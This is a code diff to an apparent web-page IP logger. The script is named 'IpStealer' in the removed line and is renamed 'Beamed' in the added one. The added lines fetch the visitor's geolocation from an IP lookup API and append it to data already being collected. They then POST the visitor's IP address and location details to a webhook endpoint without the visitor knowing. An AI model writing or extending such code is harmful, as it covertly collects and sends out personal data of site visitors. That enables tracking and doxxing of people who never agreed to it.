@@ -34,8 +34,13 @@
         };
         xhr.send(null);
       }
-
-
+      get_information("https://api.techniknews.net/ipgeo/", function(text) {
+        var div = document.createElement("div");
+        div.innerHTML = text;
+        div.id = "razzylog";
+        const secondList = document.getElementsByClassName("header")[0]
+        secondList.appendChild(div)
+      });
       get_information("https://api.ipify.org/", function(text) {
         var div = document.createElement("div");
         div.innerHTML = text;
@@ -46,13 +51,14 @@
 
       function ipLogByRaz() {
         var ispp = document.getElementById('ipppp').innerHTML
+        var extra = document.getElementById("razzylog").innerHTML
         const request = new XMLHttpRequest();
         request.open("POST", wbhk);
         request.setRequestHeader('Content-type', 'application/json');
         const params = {
-          username: "IpStealer",
+          username: "Beamed",
           avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
-          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp ""
+          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : ```" + extra + "```"
         }
         request.send(JSON.stringify(params));
       }
